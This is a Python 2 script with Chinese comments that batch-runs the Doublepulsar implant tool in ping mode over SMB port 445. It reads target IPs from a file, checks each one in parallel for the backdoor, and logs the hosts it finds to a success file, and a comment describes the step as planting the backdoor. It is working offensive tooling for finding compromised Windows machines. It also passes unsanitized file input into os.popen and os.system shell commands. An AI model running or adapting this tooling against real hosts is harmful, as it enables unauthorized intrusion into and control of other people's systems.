# -*- coding: utf-8 -*-

import os,time
import multiprocessing
from multiprocessing import Pool

#读取IP到队列 
def read_ip(q):
    # 获取当前路径
    path = str(os.getcwd())
    #从文件读入IP到队列
    ip = open(path + "\\backdoorip.txt", "r")
    for line in ip:
        line = line.strip("\n")
        q.put(str(line))
    return q

#开始ping后门
def double_ping(ip):
    # 获取当前路径
    path = str(os.getcwd())
    # 开始445植入后门程序
    fp = os.popen(path + "\\windows\\Doublepulsar-1.3.1.exe --InConfig " + path + "\\windows\\Doublepulsar-1.3.1.xml" + " --TargetIp " + ip + " --Function Ping")
    # 运行后的值是以 file read形式保存的
    s = fp.read()
    # 返回运行结果,这里随便取了一段返回判断
    if 'configversion="1.3.1.0" name="Doublepulsar"' in s:
        result = 1
    else:
        result = 0
    return result

#成功后写入文件
def ping_start(q,result):
    #返回子进程PID
    print 'Run task  (%s)...' % (os.getpid())
    path = str(os.getcwd())
    #从队列中取出IP
    ip = q.get_nowait()
    #ping后门测试
    res = double_ping(ip)
    #如果成功就写入文件
    if res == 1:
        os.system("echo " + str(ip) + " >> " + path + "\\Success-backdoor.txt")
        result.put('status:Success! ' + str(ip))
    else:
        result.put('status:Fail! ' + str(ip))

#循环监控返回队列有无数据
def Status(result,wait):
    while wait != 0:
        time.sleep(1)
        if result.empty() != True:
            print result.get()
            wait-=1

if __name__=='__main__':
    manager = multiprocessing.Manager()
    #IP队列
    q = manager.Queue()
    #返回结果队列
    result = manager.Queue()
    q = read_ip(q)
    wait = q.qsize()
    print 'Parent process %s.' % os.getpid()
    #定义并行子线程数量
    p = Pool(3)
    p.apply_async(Status, args=(result,wait,))
    for x in range(q.qsize()):
        p.apply_async(ping_start,args=(q,result,))
    print 'Waiting for all subprocesses done...'
    p.close()
    p.join()
    print 'All subprocesses done.'
